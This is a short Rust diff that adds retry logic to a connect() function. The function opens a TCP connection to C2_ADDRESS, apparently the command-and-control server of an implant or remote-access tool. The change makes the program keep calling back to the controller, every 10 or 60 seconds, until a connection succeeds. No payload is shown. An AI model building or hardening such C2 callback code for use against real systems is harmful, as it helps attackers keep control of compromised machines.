@@ -35,5 +35,18 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
 }
 
 fn connect() -> TcpStream {
-    TcpStream::connect(C2_ADDRESS).unwrap()
+    loop {
+        let stream = TcpStream::connect(C2_ADDRESS);
+        if stream.is_err() {
+            println!("Failed to estabilish a connection to the C2, retrying in a minute...");
+            sleep(Duration::from_secs(if cfg!(debug_assertions) {
+                10
+            } else {
+                60
+            }));
+            continue;
+        }
+
+        return stream.unwrap();
+    }
 }
